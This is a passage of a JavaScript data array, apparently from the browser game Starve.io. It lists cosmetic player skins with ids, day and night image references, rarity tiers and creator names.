                            night: IMAGES.PLAYER8N,
                            dayHand: IMAGES.HAND8D,
                            nightHand: IMAGES.HAND8N,
                            rarity: RARITY.WOOD,
                            author: "Starve.io",
                            name: "Bored 1"
                        }, {
                            id: 10,
                            day: IMAGES.PLAYER10D,
                            night: IMAGES.PLAYER10N,
                            dayHand: IMAGES.HAND10D,
                            nightHand: IMAGES.HAND10N,
                            rarity: RARITY.WOOD,
                            author: "Starve.io",
                            name: "Happy 2"
                        }, {
                            id: 11,
                            day: IMAGES.PLAYER11D,
                            night: IMAGES.PLAYER11N,
                            dayHand: IMAGES.HAND11D,
                            nightHand: IMAGES.HAND11N,
                            rarity: RARITY.WOOD,
                            author: "Starve.io",
                            name: "Crazy"
                        }, {
                            id: 12,
                            day: IMAGES.PLAYER12D,
                            night: IMAGES.PLAYER12N,
                            dayHand: IMAGES.HAND12D,
                            nightHand: IMAGES.HAND12N,
                            rarity: RARITY.WOOD,
                            author: "Starve.io",
                            name: "Happy 3"
                        }, {
                            id: 13,
                            day: IMAGES.PLAYER13D,
                            night: IMAGES.PLAYER13N,
                            dayHand: IMAGES.HAND13D,
                            nightHand: IMAGES.HAND13N,
                            rarity: RARITY.WOOD,
                            author: "Starve.io",
                            name: "Very Cute"
                        }, {
                            id: 14,
                            day: IMAGES.PLAYER14D,
                            night: IMAGES.PLAYER14N,
                            dayHand: IMAGES.HAND14D,
                            nightHand: IMAGES.HAND14N,
                            rarity: RARITY.WOOD,
                            author: "Starve.io",
                            name: "Curious"
                        }, {
                            id: 15,
                            day: IMAGES.PLAYER15D,
                            night: IMAGES.PLAYER15N,
                            dayHand: IMAGES.HAND15D,
                            nightHand: IMAGES.HAND15N,
                            rarity: RARITY.WOOD,
                            author: "Starve.io",
                            name: "Bored 2"
                        }, {
                            id: 16,
                            day: IMAGES.PLAYER16D,
                            night: IMAGES.PLAYER16N,
                            dayHand: IMAGES.HAND16D,
                            nightHand: IMAGES.HAND16N,
                            rarity: RARITY.WOOD,
                            author: "Starve.io",
                            name: "Happy 4"
                        }, {
                            id: 17,
                            day: IMAGES.PLAYER17D,
                            night: IMAGES.PLAYER17N,
                            dayHand: IMAGES.HAND17D,
                            nightHand: IMAGES.HAND17N,
                            rarity: RARITY.WOOD,
                            author: "Starve.io",
                            name: "Scar 2"
                        }, {
                            id: 18,
                            day: IMAGES.PLAYER18D,
                            night: IMAGES.PLAYER18N,
                            dayHand: IMAGES.HAND18D,
                            nightHand: IMAGES.HAND18N,
                            rarity: RARITY.WOOD,
                            author: "Starve.io",
                            name: "Sick"
                        }, {
                            id: 19,
                            day: IMAGES.PLAYER19D,
                            night: IMAGES.PLAYER19N,
                            dayHand: IMAGES.HAND19D,
                            nightHand: IMAGES.HAND19N,
                            rarity: RARITY.WOOD,
                            author: "Starve.io",
                            name: "Somnambule"
                        }, {
                            id: 24,
                            day: IMAGES.SKIN7D,
                            night: IMAGES.SKIN7N,
                            dayHand: IMAGES.HAND_SKIN7D,
                            nightHand: IMAGES.HAND_SKIN7N,
                            rarity: RARITY.WOOD,
                            author: "Pixelbitie",
                            name: "Feel Bad"
                        }, {
                            id: 23,
                            day: IMAGES.SKIN0D,
                            night: IMAGES.SKIN0N,
                            dayHand: IMAGES.HAND_SKIN0D,
                            nightHand: IMAGES.HAND_SKIN0N,
                            rarity: RARITY.WOOD,
                            author: "Pixelbitie",
                            name: "Mmmh."
                        }, {
                            id: 103,
                            day: IMAGES.SKIN78D,
                            night: IMAGES.SKIN78N,
                            dayHand: IMAGES.HAND_SKIN78D,
                            nightHand: IMAGES.HAND_SKIN78N,
                            rarity: RARITY.WOOD,
                            author: "pizza wa",
                            name: "Panic"
                        }, {
                            id: 105,
                            day: IMAGES.SKIN80D,
                            night: IMAGES.SKIN80N,
                            dayHand: IMAGES.HAND_SKIN80D,
                            nightHand: IMAGES.HAND_SKIN80N,
                            rarity: RARITY.WOOD,
                            author: "pizza wa",
                            name: "Hypnotic"
                        }, {
                            id: 106,
                            day: IMAGES.SKIN81D,
                            night: IMAGES.SKIN81N,
                            dayHand: IMAGES.HAND_SKIN81D,
                            nightHand: IMAGES.HAND_SKIN81N,
                            rarity: RARITY.WOOD,
                            author: "pizza wa",
                            name: "Stars in the eyes"
                        }, {
                            id: 104,
                            day: IMAGES.SKIN79D,
                            night: IMAGES.SKIN79N,
                            dayHand: IMAGES.HAND_SKIN79D,
                            nightHand: IMAGES.HAND_SKIN79N,
                            rarity: RARITY.STONE,
                            author: "pizza wa",
                            name: "Scared at night"
                        }, {
                            id: 20,
                            day: IMAGES.SKIN_VAMPIRED,
                            night: IMAGES.SKIN_VAMPIREN,
                            dayHand: IMAGES.HAND_VAMPIRED,
                            nightHand: IMAGES.HAND_VAMPIREN,
                            rarity: RARITY.STONE,
                            author: "Starve.io",
                            name: "Vampire"
                        }, {
                            id: 21,
                            day: IMAGES.SKIN_ZOMBIED,
                            night: IMAGES.SKIN_ZOMBIEN,
                            dayHand: IMAGES.HAND_ZOMBIED,
                            nightHand: IMAGES.HAND_ZOMBIEN,
                            rarity: RARITY.STONE,
                            author: "Starve.io",
                            name: "Zombie"
                        }, {
                            id: 22,
                            day: IMAGES.SKIN_DEVASTD,
                            night: IMAGES.SKIN_DEVASTN,
                            dayHand: IMAGES.HAND_DEVASTD,
                            nightHand: IMAGES.HAND_DEVASTN,
                            rarity: RARITY.STONE,
                            author: "Pixelbitie",
                            name: "Devaster"
                        }, {
                            id: 116,
                            day: IMAGES.SKIN91D,
                            night: IMAGES.SKIN91N,
                            dayHand: IMAGES.HAND_SKIN91D,
                            nightHand: IMAGES.HAND_SKIN91N,
                            rarity: RARITY.STONE,
                            author: "Fukss",
                            name: "Dead Devaster"
                        }, {
                            id: 27,
                            day: IMAGES.SKIN19D,
                            night: IMAGES.SKIN19N,
                            dayHand: IMAGES.HAND_SKIN19D,
                            nightHand: IMAGES.HAND_SKIN19N,
                            rarity: RARITY.STONE,
                            author: "Winter",
                            name: "Cactus"
                        }, {
                            id: 28,
                            day: IMAGES.SKIN20D,
                            night: IMAGES.SKIN20N,
                            dayHand: IMAGES.HAND_SKIN20D,
                            nightHand: IMAGES.HAND_SKIN20N,
                            rarity: RARITY.STONE,
                            author: "pizza wa",
                            name: "Bee"
                        }, {
                            id: 49,
                            day: IMAGES.SKIN24D,
                            night: IMAGES.SKIN24N,
                            dayHand: IMAGES.HAND_SKIN24D,
                            nightHand: IMAGES.HAND_SKIN24N,
                            rarity: RARITY.STONE,
                            author: "Taco4Life",
                            name: "Camo Skin"
                        }, {
                            id: 58,
                            day: IMAGES.SKIN34D,
                            night: IMAGES.SKIN34N,
                            dayHand: IMAGES.HAND_SKIN34D,
                            nightHand: IMAGES.HAND_SKIN34N,
                            rarity: RARITY.STONE,
                            author: "Starve.io",
                            name: "Blue Limax Skin"
                        }, {
                            id: 59,
                            day: IMAGES.SKIN33D,
                            night: IMAGES.SKIN33N,
                            dayHand: IMAGES.HAND_SKIN33D,
                            nightHand: IMAGES.HAND_SKIN33N,
                            rarity: RARITY.STONE,
                            author: "Starve.io",
                            name: "Red Limax Skin"
                        }, {
                            id: 94,
                            day: IMAGES.SKIN69D,
                            night: IMAGES.SKIN69N,
                            dayHand: IMAGES.HAND_SKIN69D,
                            nightHand: IMAGES.HAND_SKIN69N,
                            rarity: RARITY.STONE,
                            author: "Taco4Life",
                            name: "Mr. Pumpkin"
                        }, {
                            id: 109,
                            day: IMAGES.SKIN84D,
                            night: IMAGES.SKIN84N,
                            dayHand: IMAGES.HAND_SKIN84D,
                            nightHand: IMAGES.HAND_SKIN84N,
                            rarity: RARITY.STONE,
                            author: "pizza wa",
                            name: "Wood"
                        }, {
                            id: 114,
                            day: IMAGES.SKIN89D,
                            night: IMAGES.SKIN89N,
                            dayHand: IMAGES.HAND_SKIN89D,
                            nightHand: IMAGES.HAND_SKIN89N,
                            rarity: RARITY.STONE,
                            author: "pizza wa",
                            name: "Zebra"
                        }, {
                            id: 120,
                            day: IMAGES.SKIN95D,
                            night: IMAGES.SKIN95N,
                            dayHand: IMAGES.HAND_SKIN95D,
                            nightHand: IMAGES.HAND_SKIN95N,
                            rarity: RARITY.STONE,
                            author: "CrysTal",
                            name: "Tiger"
                        }, {
                            id: 134,
                            day: IMAGES.SKIN109D,
                            night: IMAGES.SKIN109N,
                            dayHand: IMAGES.HAND_SKIN109D,
                            nightHand: IMAGES.HAND_SKIN109N,
                            rarity: RARITY.STONE,
                            author: "Franchestcreator",
                            name: "Day or Night"
                        }, {
                            id: 135,
                            day: IMAGES.SKIN110D,
                            night: IMAGES.SKIN110N,
                            dayHand: IMAGES.HAND_SKIN110D,
                            nightHand: IMAGES.HAND_SKIN110N,
                            rarity: RARITY.STONE,
                            author: "Poinet",
                            name: "Square Starver"
                        }, {
                            id: 136,
                            day: IMAGES.SKIN111D,
                            night: IMAGES.SKIN111N,
                            dayHand: IMAGES.HAND_SKIN111D,
                            nightHand: IMAGES.HAND_SKIN111N,
                            rarity: RARITY.STONE,
                            author: "Starve.io",
                            name: "Voodoo Doll"
                        }, {
                            id: 137,
                            day: IMAGES.SKIN112D,
                            night: IMAGES.SKIN112N,
                            dayHand: IMAGES.HAND_SKIN112D,
                            nightHand: IMAGES.HAND_SKIN112N,
                            rarity: RARITY.STONE,
                            author: "Starve.io",
                            name: "Frankenstein"
                        }, {
                            id: 138,
                            day: IMAGES.SKIN114D,
                            night: IMAGES.SKIN114N,
                            dayHand: IMAGES.HAND_SKIN114D,
                            nightHand: IMAGES.HAND_SKIN114N,
                            rarity: RARITY.STONE,
                            author: "Starve.io",
                            name: "Old Mummy"
                        }, {
                            id: 139,
                            day: IMAGES.SKIN115D,
                            night: IMAGES.SKIN115N,
                            dayHand: IMAGES.HAND_SKIN115D,
                            nightHand: IMAGES.HAND_SKIN115N,
                            rarity: RARITY.STONE,
                            author: "Starve.io",
                            name: "Werewolf"
                        }, {
                            id: 140,
                            day: IMAGES.SKIN116D,
                            night: IMAGES.SKIN116N,
                            dayHand: IMAGES.HAND_SKIN116D,
                            nightHand: IMAGES.HAND_SKIN116N,
                            rarity: RARITY.STONE,
                            author: "Starve.io",
                            name: "Old Cthulhu"
                        }, {
                            id: 141,
                            day: IMAGES.SKIN117D,
                            night: IMAGES.SKIN117N,
                            dayHand: IMAGES.HAND_SKIN117D,
                            nightHand: IMAGES.HAND_SKIN117N,
                            rarity: RARITY.STONE,
                            author: "Starve.io",
                            name: "Sea Man"
                        }, {
                            id: 142,
                            day: IMAGES.SKIN118D,
                            night: IMAGES.SKIN118N,
                            dayHand: IMAGES.HAND_SKIN118D,
                            nightHand: IMAGES.HAND_SKIN118N,
                            rarity: RARITY.STONE,
                            author: "Starve.io",
                            name: "Old Pumpkin"
                        }, {
                            id: 148,
                            day: IMAGES.SKIN124D,
                            night: IMAGES.SKIN124N,
                            dayHand: IMAGES.HAND_SKIN124D,
                            nightHand: IMAGES.HAND_SKIN124N,
                            rarity: RARITY.STONE,
                            author: "Starve.io",
                            name: "Old Snowman"
                        }, {
                            id: 149,
                            day: IMAGES.SKIN125D,
                            night: IMAGES.SKIN125N,
                            dayHand: IMAGES.HAND_SKIN125D,
                            nightHand: IMAGES.HAND_SKIN125N,
                            rarity: RARITY.STONE,
                            author: "Starve.io",
                            name: "Old Christmas Tree Man"
                        }, {
                            id: 150,
                            day: IMAGES.SKIN126D,
                            night: IMAGES.SKIN126N,
                            dayHand: IMAGES.HAND_SKIN126D,
                            nightHand: IMAGES.HAND_SKIN126N,
                            rarity: RARITY.STONE,
                            author: "Starve.io",
                            name: "Old Mrs Bell"
                        }, {
                            id: 151,
                            day: IMAGES.SKIN127D,
                            night: IMAGES.SKIN127N,
                            dayHand: IMAGES.HAND_SKIN127D,
                            nightHand: IMAGES.HAND_SKIN127N,
                            rarity: RARITY.STONE,
                            author: "Starve.io",
                            name: "Old Elfy"
                        }, {
                            id: 152,
                            day: IMAGES.SKIN128D,
                            night: IMAGES.SKIN128N,
                            dayHand: IMAGES.HAND_SKIN128D,
                            nightHand: IMAGES.HAND_SKIN128N,
                            rarity: RARITY.STONE,
                            author: "Starve.io",
                            name: "Old Mr Present"
                        }, {
                            id: 153,
                            day: IMAGES.SKIN129D,
                            night: IMAGES.SKIN129N,
                            dayHand: IMAGES.HAND_SKIN129D,
                            nightHand: IMAGES.HAND_SKIN129N,
                            rarity: RARITY.STONE,
                            author: "Starve.io",
                            name: "My Dear Old Deer"
                        }, {
                            id: 154,
                            day: IMAGES.SKIN130D,
                            night: IMAGES.SKIN130N,
                            dayHand: IMAGES.HAND_SKIN130D,
                            nightHand: IMAGES.HAND_SKIN130N,
                            rarity: RARITY.STONE,
                            author: "Starve.io",
                            name: "Mr Angel"
                        }, {
                            id: 155,
                            day: IMAGES.SKIN131D,
                            night: IMAGES.SKIN131N,
                            dayHand: IMAGES.HAND_SKIN131D,
                            nightHand: IMAGES.HAND_SKIN131N,
                            rarity: RARITY.STONE,
                            author: "Starve.io",
                            name: "Mr Ice Cube"
                        }, {
                            id: 156,
                            day: IMAGES.SKIN132D,
                            night: IMAGES.SKIN132N,
                            dayHand: IMAGES.HAND_SKIN132D,
                            nightHand: IMAGES.HAND_SKIN132N,
                            rarity: RARITY.STONE,
                            author: "Starve.io",
                            name: "Mr Snowman"
                        }, {
                            id: 159,
                            day: IMAGES.SKIN135D,
                            night: IMAGES.SKIN135N,
                            dayHand: IMAGES.HAND_SKIN135D,
                            nightHand: IMAGES.HAND_SKIN135N,
                            rarity: RARITY.STONE,
                            author: "CrysTal",
                            name: "Crystal Sky Skin"
                        }, {
                            id: 167,
                            day: IMAGES.SKIN143D,
                            night: IMAGES.SKIN143N,
                            dayHand: IMAGES.HAND_SKIN143D,
                            nightHand: IMAGES.HAND_SKIN143N,
                            rarity: RARITY.STONE,
                            author: "Franchestcreator",
                            name: "Radioactive Starver"
                        }, {
                            id: 169,
                            day: IMAGES.SKIN146D,
                            night: IMAGES.SKIN146N,
                            dayHand: IMAGES.HAND_SKIN146D,
                            nightHand: IMAGES.HAND_SKIN146N,
                            rarity: RARITY.STONE,
                            author: "TheScaryBlaze",
                            name: "Eaten Cookie"
                        }, {
                            id: 170,
                            day: IMAGES.SKIN147D,
                            night: IMAGES.SKIN147N,
                            dayHand: IMAGES.HAND_SKIN147D,
                            nightHand: IMAGES.HAND_SKIN147N,
                            rarity: RARITY.STONE,
                            author: "aloner",
                            name: "Blob Thing"
                        }, {
                            id: 172,
                            day: IMAGES.SKIN149D,
                            night: IMAGES.SKIN149N,
                            dayHand: IMAGES.HAND_SKIN149D,
                            nightHand: IMAGES.HAND_SKIN149N,
                            rarity: RARITY.STONE,
                            author: "aloner",
                            name: "Machine Mask"
                        }, {
                            id: 29,
                            day: IMAGES.SKIN2D,
                            night: IMAGES.SKIN2N,
                            dayHand: IMAGES.HAND_SKIN2D,
                            nightHand: IMAGES.HAND_SKIN2N,
                            rarity: RARITY.GOLD,
                            author: "Pixelbitie",
                            name: "Lollipop 1"
                        }, {
                            id: 30,
                            day: IMAGES.SKIN3D,
                            night: IMAGES.SKIN3N,
                            dayHand: IMAGES.HAND_SKIN3D,
                            nightHand: IMAGES.HAND_SKIN3N,
                            rarity: RARITY.GOLD,
                            author: "Starve.io",
                            name: "Lollipop 2"
                        }, {
                            id: 31,
                            day: IMAGES.SKIN4D,
                            night: IMAGES.SKIN4N,
                            dayHand: IMAGES.HAND_SKIN4D,
                            nightHand: IMAGES.HAND_SKIN4N,
                            rarity: RARITY.GOLD,
                            author: "Starve.io",
                            name: "Lollipop 3"
                        }, {
                            id: 32,
                            day: IMAGES.SKIN5D,
                            night: IMAGES.SKIN5N,
                            dayHand: IMAGES.HAND_SKIN5D,
                            nightHand: IMAGES.HAND_SKIN5N,
                            rarity: RARITY.GOLD,
                            author: "Starve.io",
                            name: "Lollipop 4"
                        }, {
                            id: 33,
                            day: IMAGES.SKIN8D,
                            night: IMAGES.SKIN8N,
                            dayHand: IMAGES.HAND_SKIN8D,
                            nightHand: IMAGES.HAND_SKIN8N,
                            rarity: RARITY.GOLD,
                            author: "Sushui",
                            name: "Yellow Bird"
                        }, {
                            id: 34,
                            day: IMAGES.SKIN9D,
                            night: IMAGES.SKIN9N,
                            dayHand: IMAGES.HAND_SKIN9D,
                            nightHand: IMAGES.HAND_SKIN9N,
                            rarity: RARITY.GOLD,
                            author: "Sushui",
                            name: "Red Bird"
                        }, {
                            id: 35,
                            day: IMAGES.SKIN10D,
                            night: IMAGES.SKIN10N,
                            dayHand: IMAGES.HAND_SKIN10D,
                            nightHand: IMAGES.HAND_SKIN10N,
                            rarity: RARITY.GOLD,
                            author: "Sushui",
                            name: "Blue Bird"
                        }, {
                            id: 37,
                            day: IMAGES.SKIN17D,
                            night: IMAGES.SKIN17N,
                            dayHand: IMAGES.HAND_SKIN17D,
                            nightHand: IMAGES.HAND_SKIN17N,
                            rarity: RARITY.GOLD,
                            author: "Winter",
                            name: "Owl"
                        }, {
                            id: 52,
                            day: IMAGES.SKIN27D,
                            night: IMAGES.SKIN27N,
                            dayHand: IMAGES.HAND_SKIN27D,
                            nightHand: IMAGES.HAND_SKIN27N,
                            rarity: RARITY.GOLD,
                            author: "Starve.io",
                            name: "Nemo"
                        }, {
                            id: 53,
                            day: IMAGES.SKIN28D,
                            night: IMAGES.SKIN28N,
                            dayHand: IMAGES.HAND_SKIN28D,
                            nightHand: IMAGES.HAND_SKIN28N,
                            rarity: RARITY.GOLD,
                            author: "Starve.io",
                            name: "Mr. Bread"
                        }, {
                            id: 74,
                            day: IMAGES.SKIN49D,
                            night: IMAGES.SKIN49N,
                            dayHand: IMAGES.HAND_SKIN49D,
                            nightHand: IMAGES.HAND_SKIN49N,
                            rarity: RARITY.GOLD,
                            author: "Communist & Taco4Life",
                            name: "Mr. Bread 2"
                        }, {
                            id: 75,
                            day: IMAGES.SKIN50D,
                            night: IMAGES.SKIN50N,
                            dayHand: IMAGES.HAND_SKIN50D,
                            nightHand: IMAGES.HAND_SKIN50N,
                            rarity: RARITY.GOLD,
                            author: "Communist & Taco4Life",
                            name: "Mr. Bread 3"
                        }, {
                            id: 60,
                            day: IMAGES.SKIN35D,
                            night: IMAGES.SKIN35N,
                            dayHand: IMAGES.HAND_SKIN35D,
                            nightHand: IMAGES.HAND_SKIN35N,
                            rarity: RARITY.GOLD,
                            author: "Starve.io",
                            name: "Red Berry"
                        }, {
                            id: 61,
                            day: IMAGES.SKIN36D,
                            night: IMAGES.SKIN36N,
                            dayHand: IMAGES.HAND_SKIN36D,
                            nightHand: IMAGES.HAND_SKIN36N,
                            rarity: RARITY.GOLD,
                            author: "Starve.io",
                            name: "Old Berry"
                        }, {
                            id: 70,
                            day: IMAGES.SKIN45D,
                            night: IMAGES.SKIN45N,
                            dayHand: IMAGES.HAND_SKIN45D,
                            nightHand: IMAGES.HAND_SKIN45N,
                            rarity: RARITY.GOLD,
                            author: "eogito",
                            name: "Cake"
                        }, {
                            id: 71,
                            day: IMAGES.SKIN46D,
                            night: IMAGES.SKIN46N,
                            dayHand: IMAGES.HAND_SKIN46D,
                            nightHand: IMAGES.HAND_SKIN46N,
                            rarity: RARITY.GOLD,
                            author: "eogito",
                            name: "Christmas Cake"
                        }, {
                            id: 77,
                            day: IMAGES.SKIN52D,
                            night: IMAGES.SKIN52N,
                            dayHand: IMAGES.HAND_SKIN52D,
                            nightHand: IMAGES.HAND_SKIN52N,
                            rarity: RARITY.GOLD,
                            author: "Pancakez",
                            name: "Mr. Pancake"
                        }, {
                            id: 87,
                            day: IMAGES.SKIN62D,
                            night: IMAGES.SKIN62N,
                            dayHand: IMAGES.HAND_SKIN62D,
                            nightHand: IMAGES.HAND_SKIN62N,
                            rarity: RARITY.GOLD,
                            author: "Taco4Life",
                            name: "Mr. Taco"
                        }, {
                            id: 78,
                            day: IMAGES.SKIN53D,
                            night: IMAGES.SKIN53N,
                            dayHand: IMAGES.HAND_SKIN53D,
                            nightHand: IMAGES.HAND_SKIN53N,
                            rarity: RARITY.GOLD,
                            author: "Taco4Life",
                            name: "Mr. Bottle"
                        }, {
                            id: 79,
                            day: IMAGES.SKIN54D,
                            night: IMAGES.SKIN54N,
                            dayHand: IMAGES.HAND_SKIN54D,
                            nightHand: IMAGES.HAND_SKIN54N,
                            rarity: RARITY.GOLD,
                            author: "Taco4Life",
                            name: "Mr. Bottle 2"
                        }, {
                            id: 97,
                            day: IMAGES.SKIN71D,
                            night: IMAGES.SKIN71N,
                            dayHand: IMAGES.HAND_SKIN71D,
                            nightHand: IMAGES.HAND_SKIN71N,
                            rarity: RARITY.GOLD,
                            author: "eogito",
                            name: "Pink Rabbit"
                        }, {
                            id: 102,
                            day: IMAGES.SKIN77D,
                            night: IMAGES.SKIN77N,
                            dayHand: IMAGES.HAND_SKIN77D,
                            nightHand: IMAGES.HAND_SKIN77N,
                            rarity: RARITY.GOLD,
                            author: "pizza wa",
                            name: "Marshmallow"
                        }, {
                            id: 107,
                            day: IMAGES.SKIN82D,
                            night: IMAGES.SKIN82N,
                            dayHand: IMAGES.HAND_SKIN82D,
                            nightHand: IMAGES.HAND_SKIN82N,
                            rarity: RARITY.GOLD,
                            author: "eogito",
                            name: "Fox"
                        }, {
                            id: 132,
                            day: IMAGES.SKIN107D,
                            night: IMAGES.SKIN107N,
                            dayHand: IMAGES.HAND_SKIN107D,
                            nightHand: IMAGES.HAND_SKIN107N,
                            rarity: RARITY.GOLD,
                            author: "eogito",
                            name: "Raccoon"
                        }, {
                            id: 111,
                            day: IMAGES.SKIN86D,
                            night: IMAGES.SKIN86N,
                            dayHand: IMAGES.HAND_SKIN86D,
                            nightHand: IMAGES.HAND_SKIN86N,
                            rarity: RARITY.GOLD,
                            author: "pizza wa",
                            name: "Cloud"
                        }, {
                            id: 113,
                            day: IMAGES.SKIN88D,
                            night: IMAGES.SKIN88N,
                            dayHand: IMAGES.HAND_SKIN88D,
                            nightHand: IMAGES.HAND_SKIN88N,
                            rarity: RARITY.GOLD,
                            author: "pizza wa",
                            name: "Moon"
                        }, {
                            id: 117,
                            day: IMAGES.SKIN92D,
                            night: IMAGES.SKIN92N,
                            dayHand: IMAGES.HAND_SKIN92D,
                            nightHand: IMAGES.HAND_SKIN92N,
                            rarity: RARITY.GOLD,
                            author: "eogito",
                            name: "Mr. Panda"
                        }, {
                            id: 118,
                            day: IMAGES.SKIN93D,
                            night: IMAGES.SKIN93N,
                            dayHand: IMAGES.HAND_SKIN93D,
                            nightHand: IMAGES.HAND_SKIN93N,
                            rarity: RARITY.GOLD,
                            author: "eogito",
                            name: "Mr. Strawberry"
                        }, {
                            id: 119,
                            day: IMAGES.SKIN94D,
                            night: IMAGES.SKIN94N,
                            dayHand: IMAGES.HAND_SKIN94D,
                            nightHand: IMAGES.HAND_SKIN94N,
                            rarity: RARITY.GOLD,
                            author: "eogito & Sushuui",
                            name: "Mummy"
                        }, {
                            id: 122,
                            day: IMAGES.SKIN97D,
                            night: IMAGES.SKIN97N,
                            dayHand: IMAGES.HAND_SKIN97D,
                            nightHand: IMAGES.HAND_SKIN97N,
                            rarity: RARITY.GOLD,
                            author: "Taco4Life",
                            name: "Dino"
                        }, {
                            id: 127,
                            day: IMAGES.SKIN102D,
                            night: IMAGES.SKIN102N,
                            dayHand: IMAGES.HAND_SKIN102D,
                            nightHand: IMAGES.HAND_SKIN102N,
                            rarity: RARITY.GOLD,
                            author: "MADBalgouthi",
                            name: "Mr. Koala"
                        }, {
                            id: 160,
                            day: IMAGES.SKIN136D,
                            night: IMAGES.SKIN136N,
                            dayHand: IMAGES.HAND_SKIN136D,
                            nightHand: IMAGES.HAND_SKIN136N,
                            rarity: RARITY.GOLD,
                            author: "Starve.io",
                            name: "Bottle Protection"
                        }, {
                            id: 162,
                            day: IMAGES.SKIN138D,
                            night: IMAGES.SKIN138N,
                            dayHand: IMAGES.HAND_SKIN138D,
                            nightHand: IMAGES.HAND_SKIN138N,
                            rarity: RARITY.GOLD,
                            author: "CrysTal",
                            name: "Leaf Man"
                        }, {
                            id: 166,
                            day: IMAGES.SKIN142D,
                            night: IMAGES.SKIN142N,
                            dayHand: IMAGES.HAND_SKIN142D,
                            nightHand: IMAGES.HAND_SKIN142N,
                            rarity: RARITY.GOLD,
                            author: "pizza wa",
                            name: "Bubble"
                        }, {
                            id: 174,
                            day: IMAGES.SKIN145D,
                            night: IMAGES.SKIN145N,
                            dayHand: IMAGES.HAND_SKIN145D,
                            nightHand: IMAGES.HAND_SKIN145N,
                            rarity: RARITY.GOLD,
                            author: "upfiz",
                            name: "Potato"
                        }, {
                            id: 171,
                            day: IMAGES.SKIN148D,
                            night: IMAGES.SKIN148N,
                            dayHand: IMAGES.HAND_SKIN148D,
                            nightHand: IMAGES.HAND_SKIN148N,
                            rarity: RARITY.GOLD,
                            author: "aloner",
                            name: "Axolotl"
                        }, {
                            id: 25,
                            day: IMAGES.SKIN6D,
                            night: IMAGES.SKIN6N,
                            dayHand: IMAGES.HAND_SKIN6D,
                            nightHand: IMAGES.HAND_SKIN0N,
                            rarity: RARITY.DIAMOND,
                            author: "Pixelbitie",
                            name: "Test Dummy"
                        }, {
                            id: 41,
                            day: IMAGES.SKIN_STARD,
                            night: IMAGES.SKIN_STARN,
                            dayHand: IMAGES.HAND_STARD,
                            nightHand: IMAGES.HAND_STARN,
                            rarity: RARITY.DIAMOND,
                            author: "pizza wa",
                            name: "Star-ver"
                        }, {
                            id: 43,
                            day: IMAGES.SKIN11D,
                            night: IMAGES.SKIN11N,
                            dayHand: IMAGES.HAND_SKIN11D,
                            nightHand: IMAGES.HAND_SKIN11N,
                            rarity: RARITY.DIAMOND,
                            author: "Communist",
                            name: "Starver Chest"
                        }, {
                            id: 88,
                            day: IMAGES.SKIN63D,
                            night: IMAGES.SKIN63N,
                            dayHand: IMAGES.HAND_SKIN63D,
                            nightHand: IMAGES.HAND_SKIN63N,
                            rarity: RARITY.DIAMOND,
                            author: "Communist",
                            name: "Starver Workbench"
                        }, {
                            id: 121,
                            day: IMAGES.SKIN96D,
                            night: IMAGES.SKIN96N,
                            dayHand: IMAGES.HAND_SKIN96D,
                            nightHand: IMAGES.HAND_SKIN96N,
                            rarity: RARITY.DIAMOND,
                            author: "MADBalgouthi",
                            name: "Fish"
                        }, {
                            id: 39,
                            day: IMAGES.SKIN22D,
                            night: IMAGES.SKIN22N,
                            dayHand: IMAGES.HAND_SKIN22D,
                            nightHand: IMAGES.HAND_SKIN22N,
                            rarity: RARITY.DIAMOND,
                            author: "Negligent4Dia",
                            name: "Crab"
                        }, {
                            id: 40,
                            day: IMAGES.SKIN23D,
                            night: IMAGES.SKIN23N,
                            dayHand: IMAGES.HAND_SKIN23D,
                            nightHand: IMAGES.HAND_SKIN23N,
                            rarity: RARITY.DIAMOND,
                            author: "Negligent4Dia",
                            name: "Piranha"
                        }, {
                            id: 36,
                            day: IMAGES.SKIN16D,
                            night: IMAGES.SKIN16N,
                            dayHand: IMAGES.HAND_SKIN16D,
                            nightHand: IMAGES.HAND_SKIN16N,
                            rarity: RARITY.DIAMOND,
                            author: "eogito",
                            name: "Winter Fox"
                        }, {
                            id: 69,
                            day: IMAGES.SKIN44D,
                            night: IMAGES.SKIN44N,
                            dayHand: IMAGES.HAND_SKIN44D,
                            nightHand: IMAGES.HAND_SKIN44N,
                            rarity: RARITY.DIAMOND,
                            author: "Zed",
                            name: "Baby Foxy"
                        }, {
                            id: 51,
                            day: IMAGES.SKIN26D,
                            night: IMAGES.SKIN26N,
                            dayHand: IMAGES.HAND_SKIN26D,
                            nightHand: IMAGES.HAND_SKIN26N,
                            rarity: RARITY.DIAMOND,
                            author: "HOWI",
                            name: "Winter Bear"
                        }, {
                            id: 133,
                            day: IMAGES.SKIN108D,
                            night: IMAGES.SKIN108N,
                            dayHand: IMAGES.HAND_SKIN108D,
                            nightHand: IMAGES.HAND_SKIN108N,
                            rarity: RARITY.DIAMOND,
                            author: "eogito",
                            name: "Hawk"
                        }, {
                            id: 55,
                            day: IMAGES.SKIN30D,
                            night: IMAGES.SKIN30N,
                            dayHand: IMAGES.HAND_SKIN30D,
                            nightHand: IMAGES.HAND_SKIN30N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "Nice Little Yuki"
                        }, {
                            id: 68,
                            day: IMAGES.SKIN43D,
                            night: IMAGES.SKIN43N,
                            dayHand: IMAGES.HAND_SKIN43D,
                            nightHand: IMAGES.HAND_SKIN43N,
                            rarity: RARITY.DIAMOND,
                            author: "Taco4Life",
                            name: "Baby Yuki"
                        }, {
                            id: 62,
                            day: IMAGES.SKIN37D,
                            night: IMAGES.SKIN37N,
                            dayHand: IMAGES.HAND_SKIN37D,
                            nightHand: IMAGES.HAND_SKIN37N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "Mr. Carrot"
                        }, {
                            id: 56,
                            day: IMAGES.SKIN31D,
                            night: IMAGES.SKIN31N,
                            dayHand: IMAGES.HAND_SKIN31D,
                            nightHand: IMAGES.HAND_SKIN31N,
                            rarity: RARITY.DIAMOND,
                            author: "Starve.io",
                            name: "Bat Limax"
                        }, {
                            id: 72,
                            day: IMAGES.SKIN47D,
                            night: IMAGES.SKIN47N,
                            dayHand: IMAGES.HAND_SKIN47D,
                            nightHand: IMAGES.HAND_SKIN47N,
                            rarity: RARITY.DIAMOND,
                            author: "eogito",
                            name: "Mr. Crate"
                        }, {
                            id: 73,
                            day: IMAGES.SKIN48D,
                            night: IMAGES.SKIN48N,
                            dayHand: IMAGES.HAND_SKIN48D,
                            nightHand: IMAGES.HAND_SKIN48N,
                            rarity: RARITY.DIAMOND,
                            author: "Taco4Life & eogito",
                            name: "Mr. Spider"
                        }, {
                            id: 93,
